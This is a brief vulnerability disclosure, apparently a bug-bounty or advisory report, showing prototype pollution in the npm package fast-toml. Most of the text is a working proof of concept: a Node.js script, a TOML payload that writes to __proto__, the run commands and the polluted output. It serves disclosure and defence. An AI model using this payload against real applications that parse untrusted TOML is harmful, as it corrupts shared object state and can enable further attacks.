# Description

`fast-toml` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC and TOML files:

```
// poc.js
var fs = require('fs')
var TOML = require('fast-toml')
console.log("Before : " + {}.polluted);
var parsed = TOML.parse(fs.readFileSync('./payload.toml'))
console.log("After : " + {}.polluted);

//payload.toml
[__proto__]
polluted = "Yes! Its Polluted"
```


2. Execute the following commands in terminal:

```
npm i fast-toml # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
